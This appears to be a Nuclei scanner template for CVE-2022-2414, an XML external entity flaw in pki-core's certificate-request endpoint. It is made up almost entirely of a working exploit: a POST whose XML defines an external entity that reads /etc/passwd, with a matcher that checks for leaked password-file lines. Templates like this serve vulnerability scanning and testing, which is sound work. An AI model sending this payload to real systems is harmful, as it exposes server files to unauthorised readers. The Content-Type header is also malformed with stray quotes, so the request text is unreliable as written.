id: CVE-2022-2414

info:
  name: CVE-2022-2414 A flaw was found in pki-core - XXE
  author: shelled
  severity: high
  description: |
    A flaw was found in pki-core. Access to external entities when parsing XML documents can lead to XML external entity (XXE) attacks.
  reference:
    - https://github.com/amitlttwo/CVE-2022-2414-Proof-Of-Concept
  tags: cve2022,xxe,github,cve

requests:
  - raw:
    - |
      POST /ca/rest/certrequests HTTP/1.1
      Host: {{Hostname}}
      Content-Type': 'application/xml
      
      <!--?xml version="1.0" ?-->
      <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
      <CertEnrollmentRequest>
        <Attributes/>
        <ProfileID>&ent;</ProfileID>
      </CertEnrollmentRequest>
    
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
